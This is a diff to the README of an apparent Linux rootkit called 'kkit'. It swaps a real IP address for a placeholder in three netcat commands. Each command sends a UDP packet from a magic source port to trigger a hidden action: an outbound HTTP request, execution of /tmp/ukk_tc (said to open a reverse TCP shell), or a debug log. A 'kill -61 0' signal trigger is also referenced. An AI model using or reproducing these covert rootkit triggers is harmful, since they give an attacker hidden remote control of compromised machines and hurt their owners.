@@ -25,7 +25,7 @@ kill -61 0
 Trigger to send a http request:
 ```shell
 # Server:
-nc -p 1338 120.46.219.162 50005 -u
+nc -p 1338 123.123.123.123 50005 -u
 fdsfasd
 ```
 If the kkit received a udp packet sended from 1338 port to 50005 port, the kkit will send a http packet to the targeted server ip
@@ -37,7 +37,7 @@ python3 -m http.server 50002
 
 ```shell
 #Server
-nc -p 1339 120.46.219.162 50005 -u
+nc -p 1339 123.123.123.123 50005 -u
 fsdfsdaf
 ```
 If the kkit received a udp packet sended from 1339 port to 50005 port, the kkit will exexcve /tmp/ukk_tc
@@ -47,7 +47,7 @@ If the ukk_tc is a binary will establish reverse tcp connection, the kkit can es
 If want to see the running debug log:
 ```shell
 #Server
-nc -p 1340 120.46.219.162 50005 -u
+nc -p 1340 123.123.123.123 50005 -u
 fsdfsdaf
 ```
 
